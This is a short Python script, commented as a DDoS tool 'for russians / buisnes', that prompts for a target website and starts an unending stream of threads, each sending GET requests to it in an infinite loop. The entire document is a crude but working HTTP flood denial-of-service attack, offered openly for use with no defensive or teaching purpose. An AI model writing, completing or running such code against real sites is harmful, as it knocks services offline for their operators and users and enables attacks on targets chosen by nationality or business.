
import threading
import requests
import time
import sys
# ddos for russians / buisnes
site1 = input("write site with hhtp or https: ")

def dos():
 while True:
  requests.get(site1)
while True:
 threading.Thread(target=dos).start()